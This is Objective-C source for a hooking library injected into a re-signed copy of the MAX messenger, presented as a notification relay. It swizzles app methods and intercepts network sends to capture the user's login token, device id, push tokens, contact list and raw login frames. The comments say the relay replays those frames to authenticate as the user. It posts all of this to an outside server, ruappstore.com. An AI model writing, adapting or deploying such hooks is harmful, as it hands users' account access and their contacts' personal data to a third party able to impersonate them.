// MAXRelay.dylib — production hook injected into re-signed MAX. After the user logs in,
// it captures what the server-side notification mirror needs — the messenger session token,
// device id, the APNs + VoIP push tokens, the user's own id, and the contact list
// (id -> name + avatar) — and registers them with our relay over HTTPS. Almost read-only: the ONLY
// behaviour it changes is clearing our relay's delivered notifications + the badge when the app
// becomes active (see ClearDeliveredAndBadge). One registration per launch (and on token change).
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>
#import <dispatch/dispatch.h>
#import <sqlite3.h>
#import "fishhook.h"

static NSString *const kRelayURL = @"https://www.ruappstore.com/api/v1/mx-relay/register";

static NSString *gApns, *gVoip;
static id gClient;  // the messenger client, kept so we can re-register when mute state changes
// The raw cmd 6 (session init) and cmd 19 (login) frames, captured off the wire: the relay
// replays these verbatim to authenticate as the user (their encoding is not reproduced).
static NSData *gFrame6, *gFrame19;
static dispatch_queue_t gQueue;

static NSString *HexFromData(NSData *d) {
    if (![d isKindOfClass:NSData.class]) return nil;
    const unsigned char *b = d.bytes; NSMutableString *s = [NSMutableString stringWithCapacity:d.length * 2];
    for (NSUInteger i = 0; i < d.length; i++) [s appendFormat:@"%02x", b[i]];
    return s;
}

// Reads one object ivar by name through the runtime (no headers needed).
static id IvarObj(id obj, const char *name) {
    Ivar iv = obj ? class_getInstanceVariable(object_getClass(obj), name) : NULL;
    @try { return iv ? object_getIvar(obj, iv) : nil; } @catch (__unused id e) { return nil; }
}

// The messenger client keeps the credentials; the login token lives inside them.
static NSString *LoginToken(id messengerClient) {
    for (const char *k : (const char *[]){ "_messengerCredentials", "_credentials" }) {
        id creds = IvarObj(messengerClient, k);
        id tok = IvarObj(creds, "_loginToken");
        if ([tok isKindOfClass:NSString.class]) return tok;
    }
    return nil;
}

// Contacts (and the own id) come from the app's YapDatabase, which stores each contact as JSON.
static NSArray *ReadContacts(NSNumber **ownId) {
    NSString *base = [NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES) firstObject];
    NSString *db = [base stringByAppendingPathComponent:@"Application Support/database_3.db/app.db"];
    sqlite3 *handle = NULL;
    if (sqlite3_open_v2(db.fileSystemRepresentation, &handle, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) return nil;

    NSMutableArray *out = [NSMutableArray array];
    sqlite3_stmt *st = NULL;
    if (sqlite3_prepare_v2(handle, "SELECT data FROM database2 WHERE collection IN ('contacts','synced_local_contacts')", -1, &st, NULL) == SQLITE_OK) {
        while (sqlite3_step(st) == SQLITE_ROW) {
            const void *bytes = sqlite3_column_blob(st, 0); int len = sqlite3_column_bytes(st, 0);
            if (!bytes || len <= 0) continue;
            NSData *blob = [NSData dataWithBytes:bytes length:len];
            NSRange a = [blob rangeOfData:[@"{\"" dataUsingEncoding:NSUTF8StringEncoding] options:0 range:NSMakeRange(0, blob.length)];
            NSRange b = [blob rangeOfData:[@"}" dataUsingEncoding:NSUTF8StringEncoding] options:NSDataSearchBackwards range:NSMakeRange(0, blob.length)];
            if (a.location == NSNotFound || b.location == NSNotFound || b.location < a.location) continue;
            NSData *json = [blob subdataWithRange:NSMakeRange(a.location, b.location + 1 - a.location)];
            id o = [NSJSONSerialization JSONObjectWithData:json options:0 error:nil];
            if (![o isKindOfClass:NSDictionary.class]) continue;
            id names = o[@"names"]; NSString *name = nil;
            if ([names isKindOfClass:NSArray.class] && [names count]) {
                id n0 = names[0];
                name = [NSString stringWithFormat:@"%@ %@", n0[@"firstName"] ?: @"", n0[@"lastName"] ?: @""];
                name = [name stringByTrimmingCharactersInSet:NSCharacterSet.whitespaceCharacterSet];
            }
            if (o[@"id"] && name.length) [out addObject:@{@"id": o[@"id"], @"name": name, @"avatar": o[@"avatarUrl"] ?: [NSNull null]}];
        }
        sqlite3_finalize(st);
    }
    if (ownId && sqlite3_prepare_v2(handle, "SELECT data FROM database2 WHERE collection='current_user_id' LIMIT 1", -1, &st, NULL) == SQLITE_OK) {
        if (sqlite3_step(st) == SQLITE_ROW) {
            const unsigned char *bytes = sqlite3_column_blob(st, 0); int len = sqlite3_column_bytes(st, 0);
            // msgpack uint32 (0xce) big-endian
            if (bytes && len == 5 && bytes[0] == 0xce)
                *ownId = @((bytes[1] << 24) | (bytes[2] << 16) | (bytes[3] << 8) | bytes[4]);
        }
        sqlite3_finalize(st);
    }
    sqlite3_close(handle);
    return out;
}

// A re-signed MAX build for a single customer is signed per device, so its embedded provisioning
// profile names exactly one device UDID. The relay sends that UDID to the backend to check the
// owner's subscription. (A profile naming several devices — a shared/cohort build — is ambiguous,
// so we send nothing and the relay leaves such installs ungated.)
static NSString *ReadProvisionedUDID(void) {
    NSString *path = [[NSBundle mainBundle] pathForResource:@"embedded" ofType:@"mobileprovision"];
    NSData *data = path ? [NSData dataWithContentsOfFile:path] : nil;
    if (!data) return nil;
    NSString *raw = [[NSString alloc] initWithData:data encoding:NSISOLatin1StringEncoding];
    NSRange s = [raw rangeOfString:@"<?xml"];
    NSRange e = [raw rangeOfString:@"</plist>"];
    if (s.location == NSNotFound || e.location == NSNotFound || e.location < s.location) return nil;
    NSData *xml = [[raw substringWithRange:NSMakeRange(s.location, e.location + e.length - s.location)]
                  dataUsingEncoding:NSISOLatin1StringEncoding];
    id plist = [NSPropertyListSerialization propertyListWithData:xml options:0 format:NULL error:nil];
    id devices = [plist isKindOfClass:NSDictionary.class] ? plist[@"ProvisionedDevices"] : nil;
    if ([devices isKindOfClass:NSArray.class] && [devices count] == 1 && [devices[0] isKindOfClass:NSString.class])
        return devices[0];
    return nil;
}

// Reads a MessagePack int that follows the marker at p (fixint / int8..int64, signed/unsigned).
static BOOL MPInt(const uint8_t *b, NSUInteger len, NSUInteger p, long long *out) {
    if (p >= len) return NO;
    uint8_t c = b[p];
    if (c <= 0x7f) { *out = c; return YES; }                 // positive fixint
    if (c >= 0xe0) { *out = (int8_t)c; return YES; }          // negative fixint
    int n; BOOL sign;
    switch (c) {
        case 0xcc: n = 1; sign = NO; break;  case 0xcd: n = 2; sign = NO; break;
        case 0xce: n = 4; sign = NO; break;  case 0xcf: n = 8; sign = NO; break;
        case 0xd0: n = 1; sign = YES; break; case 0xd1: n = 2; sign = YES; break;
        case 0xd2: n = 4; sign = YES; break; case 0xd3: n = 8; sign = YES; break;
        default: return NO;
    }
    if (p + 1 + n > len) return NO;
    unsigned long long v = 0;
    for (int i = 0; i < n; i++) v = (v << 8) | b[p + 1 + i];
    *out = sign ? (long long)((n == 8) ? v : (unsigned long long)((v ^ (1ULL << (8 * n - 1))) - (1ULL << (8 * n - 1)))) : (long long)v;
    return YES;
}

// Finds the MessagePack value that follows a fixstr key (`0xa0|len` + name), returns its offset.
static BOOL MPFind(const uint8_t *b, NSUInteger len, const char *key, NSUInteger *valueAt) {
    size_t kl = strlen(key);
    if (kl == 0 || kl > 31) return NO;
    uint8_t marker = (uint8_t)(0xa0 | kl);
    for (NSUInteger i = 0; i + 1 + kl <= len; i++) {
        if (b[i] == marker && memcmp(b + i + 1, key, kl) == 0) { *valueAt = i + 1 + kl; return YES; }
    }
    return NO;
}

// Reads the MessagePack string (fixstr / str8 / str16) at p.
static NSString *MPStrAt(const uint8_t *b, NSUInteger len, NSUInteger p) {
    if (p >= len) return nil;
    uint8_t c = b[p]; NSUInteger n, st;
    if (c >= 0xa0 && c <= 0xbf) { n = c & 0x1f; st = p + 1; }
    else if (c == 0xd9) { if (p + 1 >= len) return nil; n = b[p + 1]; st = p + 2; }
    else if (c == 0xda) { if (p + 2 >= len) return nil; n = (b[p + 1] << 8) | b[p + 2]; st = p + 3; }
    else return nil;
    if (st + n > len) return nil;
    return [[NSString alloc] initWithBytes:b + st length:n encoding:NSUTF8StringEncoding];
}

// Chats the user has muted: the relay must not push a notification for them. MAX keeps per-chat
// notification settings in YapDatabase collection `chats_config` (OKMChatConfig) as MessagePack.
// A chat is muted when `dontDisturbUntil` is -1 (muted forever) or a timestamp still in the future
// (timed mute: 1 h / 4 h / a day). `chatPk` is "server-<id>" (negative ids keep their sign, e.g.
// "server--80274928111638"). Returns the muted chat ids. Dialog, group and channel alike.
static NSArray *ReadMutedChats(void) {
    NSString *base = [NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES) firstObject];
    NSString *db = [base stringByAppendingPathComponent:@"Application Support/database_3.db/app.db"];
    sqlite3 *handle = NULL;
    if (sqlite3_open_v2(db.fileSystemRepresentation, &handle, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) return nil;

    long long nowS = (long long)time(NULL), nowMs = nowS * 1000;
    NSMutableArray *out = [NSMutableArray array];
    sqlite3_stmt *st = NULL;
    if (sqlite3_prepare_v2(handle, "SELECT data FROM database2 WHERE collection='chats_config'", -1, &st, NULL) == SQLITE_OK) {
        while (sqlite3_step(st) == SQLITE_ROW) {
            const uint8_t *b = sqlite3_column_blob(st, 0); NSUInteger len = sqlite3_column_bytes(st, 0);
            if (!b || len == 0) continue;
            NSUInteger at; long long dnd = 0;
            if (!MPFind(b, len, "dontDisturbUntil", &at) || !MPInt(b, len, at, &dnd)) continue;
            BOOL muted = (dnd == -1)
                || (dnd > 0 && dnd < 100000000000LL && dnd > nowS)      // seconds, still in the future
                || (dnd >= 100000000000LL && dnd > nowMs);              // milliseconds, still in the future
            if (!muted) continue;
            NSString *pk = MPFind(b, len, "chatPk", &at) ? MPStrAt(b, len, at) : nil;
            NSRange dash = [pk rangeOfString:@"-"];                     // split off the "server" prefix
            if (dash.location == NSNotFound) continue;
            long long cid = [[pk substringFromIndex:dash.location + 1] longLongValue];
            if (cid != 0) [out addObject:@(cid)];
        }
        sqlite3_finalize(st);
    }
    sqlite3_close(handle);
    return out;
}

static void Register(id messengerClient) {
    dispatch_async(gQueue, ^{
        @autoreleasepool {
            @try {
                NSString *token = LoginToken(messengerClient);
                id creds = IvarObj(messengerClient, "_messengerCredentials") ?: IvarObj(messengerClient, "_credentials");
                NSString *deviceId = IvarObj(creds, "_deviceId") ?: IvarObj(creds, "_syntheticDeviceId");
                if (!token || !gFrame19) return;  // need the login token and the captured auth frame
                NSNumber *ownId = nil;
                NSArray *contacts = ReadContacts(&ownId);

                NSMutableDictionary *body = [NSMutableDictionary dictionary];
                body[@"loginToken"] = token;
                if (deviceId) body[@"deviceId"] = deviceId;
                if (ownId) body[@"userId"] = ownId;
                if (gApns) body[@"apnsToken"] = gApns;
                if (gVoip) body[@"voipToken"] = gVoip;
                if (contacts) body[@"contacts"] = contacts;
                NSString *udid = ReadProvisionedUDID();
                if (udid) body[@"udid"] = udid;            // ties the mirror to a subscription
                NSArray *muted = ReadMutedChats();
                if (muted) body[@"muted"] = muted;          // chats the relay must not push
                body[@"bundleId"] = [[NSBundle mainBundle] bundleIdentifier] ?: @"";
                if (gFrame6) body[@"frame6"] = [gFrame6 base64EncodedStringWithOptions:0];
                if (gFrame19) body[@"frame19"] = [gFrame19 base64EncodedStringWithOptions:0];

                NSData *payload = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];
                if (!payload) return;
                NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:kRelayURL]];
                req.HTTPMethod = @"POST";
                [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
                req.HTTPBody = payload;
                [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
                    NSLog(@"[MAXRelay] registered (%lu contacts) -> %ld", (unsigned long)contacts.count,
                          (long)[(NSHTTPURLResponse *)r statusCode]);
                }] resume];
            } @catch (__unused id e) {}
        }
    });
}

// Capture the raw outgoing frames (Network.framework) to grab the cmd 6 / cmd 19 login frames.
// Frame header: 0a | dir | seq(2) | opcode(2 BE) | flag | len(3). We keep the first of each.
typedef void *nw_connection_t; typedef void *nw_content_context_t; typedef void *nw_error_t;
static void (*orig_nw_connection_send)(nw_connection_t, dispatch_data_t, nw_content_context_t, bool, void (^)(nw_error_t));
static void my_nw_connection_send(nw_connection_t c, dispatch_data_t content, nw_content_context_t ctx, bool complete, void (^comp)(nw_error_t)) {
    @try {
        if (content && (!gFrame6 || !gFrame19)) {
            const void *buf = NULL; size_t sz = 0;
            dispatch_data_t mapped = dispatch_data_create_map(content, &buf, &sz);
            if (buf && sz >= 10) {
                const unsigned char *p = buf;
                if (p[0] == 0x0a) {
                    unsigned opcode = (p[4] << 8) | p[5];
                    if (opcode == 6 && !gFrame6) gFrame6 = [NSData dataWithBytes:buf length:sz];
                    if (opcode == 19 && !gFrame19) gFrame19 = [NSData dataWithBytes:buf length:sz];
                }
            }
            (void)mapped;
        }
    } @catch (__unused id e) {}
    orig_nw_connection_send(c, content, ctx, complete, comp);
}

#define ORIG(name, ret, ...) static ret (*name)(id, SEL, ##__VA_ARGS__)

ORIG(o_apns, void, id, NSData *);
static void h_apns(id self, SEL _cmd, id app, NSData *token) { gApns = HexFromData(token); o_apns(self, _cmd, app, token); }

ORIG(o_voip, void, id);
static void h_voip(id self, SEL _cmd, id token) { if ([token isKindOfClass:NSData.class]) gVoip = HexFromData(token); o_voip(self, _cmd, token); }

ORIG(o_loginResp, void, id);
static void h_loginResp(id self, SEL _cmd, id resp) { o_loginResp(self, _cmd, resp); gClient = self; Register(self); }

static void Swizzle(const char *cls, const char *sel, IMP repl, void *slot) {
    Class c = objc_getClass(cls); if (!c) return;
    Method m = class_getInstanceMethod(c, sel_registerName(sel)); if (!m) return;
    *(IMP *)slot = method_getImplementation(m);
    method_setImplementation(m, repl);
}

// MAX's own read->removeDeliveredNotifications cleanup only tracks notifications it posted from its
// own message store; the banners OUR relay posts are not in that store, so MAX never clears them and
// they pile up after the user has read the chat (customer complaint: the notification stays after you
// open it). When the user opens MAX (app becomes active) clear the delivered banners and reset the
// badge — the unread state still lives in-app. Done via the runtime so we link no extra framework.
// (This is the one place the hook is not purely read-only; everything else only observes.)
static void ClearDeliveredAndBadge(void) {
    @try {
        Class unc = NSClassFromString(@"UNUserNotificationCenter");
        if (unc) {
            id center = ((id (*)(id, SEL))objc_msgSend)((id)unc, sel_registerName("currentNotificationCenter"));
            if (center) {
                ((void (*)(id, SEL))objc_msgSend)(center, sel_registerName("removeAllDeliveredNotifications"));
                SEL setBadge = sel_registerName("setBadgeCount:withCompletionHandler:");  // iOS 16+, no UIKit
                if ([center respondsToSelector:setBadge])
                    ((void (*)(id, SEL, long, id))objc_msgSend)(center, setBadge, 0, (id)nil);
            }
        }
        Class ua = NSClassFromString(@"UIApplication");  // older-iOS badge reset
        if (ua) {
            id app = ((id (*)(id, SEL))objc_msgSend)((id)ua, sel_registerName("sharedApplication"));
            if (app) ((void (*)(id, SEL, long))objc_msgSend)(app, sel_registerName("setApplicationIconBadgeNumber:"), 0);
        }
    } @catch (__unused id e) {}
}

__attribute__((constructor))
static void MAXRelayInit(void) {
    gQueue = dispatch_queue_create("mxrelay", DISPATCH_QUEUE_SERIAL);
    Swizzle("OKMPushServiceRegister", "application:didRegisterForRemoteNotificationsWithDeviceToken:", (IMP)h_apns, &o_apns);
    Swizzle("OKMAppMessengerClient", "setVoIPPushToken:", (IMP)h_voip, &o_voip);
    Swizzle("OKMMessengerClient", "_processLoginResponse:", (IMP)h_loginResp, &o_loginResp);
    struct rebinding rb = {"nw_connection_send", (void *)my_nw_connection_send, (void **)&orig_nw_connection_send};
    rebind_symbols(&rb, 1);

    // Mute state only reaches the relay at registration. The user mutes/unmutes a chat while the
    // app is open and then leaves it, so re-register when the app backgrounds (and on return): the
    // latest chats_config is read and shipped, so a just-muted chat stops pushing. (UIKit name used
    // as a string to avoid linking UIKit.)
    for (NSString *name in @[@"UIApplicationDidEnterBackgroundNotification", @"UIApplicationDidBecomeActiveNotification"]) {
        BOOL active = [name isEqualToString:@"UIApplicationDidBecomeActiveNotification"];
        [[NSNotificationCenter defaultCenter] addObserverForName:name object:nil queue:nil usingBlock:^(__unused NSNotification *n) {
            if (gClient) Register(gClient);
            if (active) ClearDeliveredAndBadge();  // opening MAX clears our relay banners + badge
        }];
    }
}
